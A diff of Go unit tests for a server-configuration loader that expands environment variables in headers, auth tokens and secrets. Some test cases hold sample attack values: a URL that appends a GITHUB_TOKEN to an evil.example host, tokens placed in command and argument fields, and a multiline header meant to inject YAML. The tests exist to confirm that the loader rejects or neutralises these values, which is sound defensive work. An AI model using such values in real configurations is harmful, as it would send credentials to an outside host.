@@ -10,57 +10,33 @@ import (
 )
 
 func TestLoadServerConfig_expandsSecretFields(t *testing.T) {
-	for _, source := range []string{"server file", "config.yaml entry"} {
-		t.Run(source, func(t *testing.T) {
-			dir := t.TempDir()
-			for key, value := range map[string]string{
-				"HEADER": "Bearer one", "ENV": "TOKEN=two", "TOKEN": "three", "CLIENT_SECRET": "four",
-			} {
-				t.Setenv("MINI_TEST_"+key, value)
-			}
-			server := "name: svc\ntransport: http\nurl: https://api.example.com\nheaders:\n  Authorization: \"${MINI_TEST_HEADER} ${MINI_TEST_TOKEN}\"\nenv: [\"${MINI_TEST_ENV}\"]\nauth:\n  type: oauth2\n  token: ${MINI_TEST_TOKEN}\n  client_secret: ${MINI_TEST_CLIENT_SECRET}\n"
-			if source == "server file" {
-				writeFile(t, filepath.Join(dir, "servers", "svc.yaml"), server)
-			} else {
-				writeFile(t, filepath.Join(dir, "config.yaml"), "servers:\n- "+strings.ReplaceAll(server, "\n", "\n  "))
-			}
-			_, servers, err := config.Load(dir)
-			if err != nil {
-				t.Fatal(err)
-			}
-			if len(servers) != 1 {
-				t.Fatalf("got %d servers, want 1", len(servers))
-			}
-			sc := servers[0]
-			if sc.Headers["Authorization"] != "Bearer one three" || sc.Env[0] != "TOKEN=two" {
-				t.Errorf("expanded headers/env: %+v, %v", sc.Headers, sc.Env)
-			}
-			if sc.Auth.Token != "three" || sc.Auth.ClientSecret != "four" {
-				t.Errorf("expanded auth: %+v", sc.Auth)
-			}
-		})
+	dir := t.TempDir()
+	for key, value := range map[string]string{
+		"HEADER": "Bearer one", "ENV": "TOKEN=two", "TOKEN": "three", "CLIENT_SECRET": "four",
+	} {
+		t.Setenv("MINI_TEST_"+key, value)
+	}
+	writeFile(t, filepath.Join(dir, "servers", "svc.yaml"), "transport: http\nurl: https://api.example.com\nheaders:\n  Authorization: \"${MINI_TEST_HEADER} ${MINI_TEST_TOKEN}\"\nenv: [\"${MINI_TEST_ENV}\"]\nauth:\n  type: oauth2\n  token: ${MINI_TEST_TOKEN}\n  client_secret: ${MINI_TEST_CLIENT_SECRET}\n")
+	sc := mustLoadOneServer(t, dir)
+	if sc.Headers["Authorization"] != "Bearer one three" || sc.Env[0] != "TOKEN=two" {
+		t.Errorf("expanded headers/env: %+v, %v", sc.Headers, sc.Env)
+	}
+	if sc.Auth.Token != "three" || sc.Auth.ClientSecret != "four" {
+		t.Errorf("expanded auth: %+v", sc.Auth)
 	}
 }
 
 func TestLoadServerConfig_unexpandedConnectionField_isRejected(t *testing.T) {
 	t.Setenv("GITHUB_TOKEN", "secret-value-must-not-leak")
-	cases := []struct{ name, source, field, value string }{
-		{"url", "server file", "url", "url: https://evil.example/?t=${GITHUB_TOKEN}\n"},
-		{"command", "server file", "command", "command: ${GITHUB_TOKEN}\n"},
-		{"args", "server file", "args[1]", "args: [first, \"${GITHUB_TOKEN}\"]\n"},
-		{"inline url", "config.yaml", "url", "url: https://evil.example/?t=${GITHUB_TOKEN}\n"},
-		{"inline command", "config.yaml", "command", "command: ${GITHUB_TOKEN}\n"},
-		{"inline args", "config.yaml", "args[1]", "args: [first, \"${GITHUB_TOKEN}\"]\n"},
+	cases := []struct{ name, field, value string }{
+		{"url", "url", "url: https://evil.example/?t=${GITHUB_TOKEN}\n"},
+		{"command", "command", "command: ${GITHUB_TOKEN}\n"},
+		{"args", "args[1]", "args: [first, \"${GITHUB_TOKEN}\"]\n"},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
 			dir := t.TempDir()
-			body := "name: svc\n" + tc.value
-			if tc.source == "server file" {
-				writeFile(t, filepath.Join(dir, "servers", "svc.yaml"), body)
-			} else {
-				writeFile(t, filepath.Join(dir, "config.yaml"), "servers:\n- "+strings.ReplaceAll(body, "\n", "\n  "))
-			}
+			writeFile(t, filepath.Join(dir, "servers", "svc.yaml"), tc.value)
 			_, _, err := config.Load(dir)
 			if err == nil {
 				t.Fatal("Load succeeded, want unexpanded field error")
@@ -80,7 +56,7 @@ func TestLoadServerConfig_unexpandedConnectionField_isRejected(t *testing.T) {
 func TestLoadServerConfig_undefinedHeader_isStrictButLenientLoadKeepsLiteral(t *testing.T) {
 	dir := t.TempDir()
 	os.Unsetenv("MINI_TEST_UNDEFINED_HEADER")
-	writeFile(t, filepath.Join(dir, "servers", "svc.yaml"), "name: svc\nheaders:\n  X-Key: ${MINI_TEST_UNDEFINED_HEADER}\n")
+	writeFile(t, filepath.Join(dir, "servers", "svc.yaml"), "headers:\n  X-Key: ${MINI_TEST_UNDEFINED_HEADER}\n")
 	_, _, err := config.Load(dir)
 	if err == nil {
 		t.Fatal("Load succeeded, want undefined variable error")
@@ -100,7 +76,7 @@ func TestLoadServerConfig_undefinedHeader_isStrictButLenientLoadKeepsLiteral(t *
 func TestLoadServerConfig_headerExpansionDoesNotInjectYAML(t *testing.T) {
 	dir := t.TempDir()
 	t.Setenv("MINI_TEST_MULTILINE_HEADER", "x\nurl: https://evil.example")
-	writeFile(t, filepath.Join(dir, "servers", "svc.yaml"), "name: svc\nurl: https://api.example.com\nheaders:\n  X-Value: ${MINI_TEST_MULTILINE_HEADER}\n")
+	writeFile(t, filepath.Join(dir, "servers", "svc.yaml"), "url: https://api.example.com\nheaders:\n  X-Value: ${MINI_TEST_MULTILINE_HEADER}\n")
 	sc := mustLoadOneServer(t, dir)
 	if sc.URL != "https://api.example.com" || sc.Headers["X-Value"] != "x\nurl: https://evil.example" {
 		t.Errorf("url/header = %q / %q", sc.URL, sc.Headers["X-Value"])
@@ -110,7 +86,7 @@ func TestLoadServerConfig_headerExpansionDoesNotInjectYAML(t *testing.T) {
 func TestLoadServerConfig_authExpansionPreservesDollar(t *testing.T) {
 	dir := t.TempDir()
 	t.Setenv("MINI_TEST_DOLLAR_TOKEN", "a$b")
-	writeFile(t, filepath.Join(dir, "servers", "svc.yaml"), "name: svc\nheaders:\n  Authorization: \"Bearer ${MINI_TEST_DOLLAR_TOKEN}\"\n")
+	writeFile(t, filepath.Join(dir, "servers", "svc.yaml"), "headers:\n  Authorization: \"Bearer ${MINI_TEST_DOLLAR_TOKEN}\"\n")
 	sc := mustLoadOneServer(t, dir)
 	if got := sc.MergedHeaders()["Authorization"]; got != "Bearer a$b" {
 		t.Errorf("Authorization = %q", got)
@@ -139,16 +115,16 @@ func TestLoadMainConfig_undefinedResponseDir_isError(t *testing.T) {
 }
 
 func TestValidateServerFile_allowsUndefinedSecretsAndRejectsInvalidConfig(t *testing.T) {
-	cases := []struct{ name, data, want string }{
-		{"undefined secret", "name: svc\nheaders:\n  X-Key: ${MISSING}\n", ""},
-		{"unexpanded url", "name: svc\nurl: https://example.com/${X}\n", "url"},
-		{"bad handshake timeout", "name: svc\nhandshake_timeout: invalid\n", "handshake_timeout"},
-		{"invalid name", "name: ../svc\n", "invalid server name"},
-		{"invalid projection format", "name: svc\nprojections:\n  t:\n    format: xml\n", "projection t: format"},
+	cases := []struct{ name, path, data, want string }{
+		{"undefined secret", "servers/svc.yaml", "headers:\n  X-Key: ${MISSING}\n", ""},
+		{"unexpanded url", "servers/svc.yaml", "url: https://example.com/${X}\n", "url"},
+		{"bad handshake timeout", "servers/svc.yaml", "handshake_timeout: invalid\n", "handshake_timeout"},
+		{"invalid name from the path", "servers/a.b.yaml", "transport: stdio\n", "invalid server name \"a.b\""},
+		{"invalid projection format", "servers/svc.yaml", "projections:\n  t:\n    format: xml\n", "projection t: format"},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
-			err := config.ValidateServerFile("server.yaml", []byte(tc.data))
+			err := config.ValidateServerFile(tc.path, []byte(tc.data))
 			if tc.want == "" && err != nil {
 				t.Fatalf("ValidateServerFile: %v", err)
 			}
